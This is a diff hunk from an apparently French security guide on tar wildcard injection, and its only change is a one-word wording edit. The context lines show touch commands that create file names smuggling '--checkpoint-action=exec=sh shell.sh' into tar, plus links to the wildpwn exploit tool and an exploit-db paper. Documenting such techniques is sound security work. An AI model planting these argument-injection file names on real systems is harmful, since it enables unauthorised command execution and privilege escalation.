@@ -31,7 +31,7 @@ touch "--checkpoint=1"
 touch "--checkpoint-action=exec=sh shell.sh"
 ```
 Vous pouvez exploiter cela en utilisant [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(attaque tar)_\
-Plus d'infos sur [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
+Plus d'infos dans [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
 
 ## Rsync
 
